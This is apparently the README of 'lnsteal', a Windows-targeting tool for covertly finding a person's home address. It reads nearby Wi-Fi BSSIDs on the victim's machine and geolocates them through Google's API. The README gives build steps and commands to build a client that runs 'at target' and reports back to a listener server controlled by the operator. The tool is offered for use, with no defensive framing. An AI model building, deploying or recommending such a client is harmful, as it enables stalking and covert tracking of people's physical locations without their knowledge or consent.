
```
 _           _             _
| |_ __  ___| |_ ___  __ _| |
| | '_ \/ __| __/ _ \/ _` | |
| | | | \__ \ ||  __/ (_| | |
|_|_| |_|___/\__\___|\__,_|_|
```
## what is the this tool.

lnsteal is a tool to steal adress to residence from BSSID of wifi.  
⚠Currently, the only supported OS is Windows.

## how
Google map also gets the surrounding access points when creating the map.  
You can get the address to residence from the information of the access point by using the API    
provided by google.  

## build

```bash
git clone https://github.com/0x6d61/lnsteal.git
cd lnsteal
go mod tidy
go build
```

## setup

Add the google api key to the environment variable with the name GOOGLE_API_KEY.

```bash
export GOOGLE_API_KEY="YOUR API KEY"
```

Next step is at target build a client to execute.

```bash
./lnsteal -b -i "Your server ip address" -p "Port to listen on server"
```

Launch a server that listens for data from clients

```bash
./lnsteal -s -p "Port to listen on server"
```

Execute at target a client code.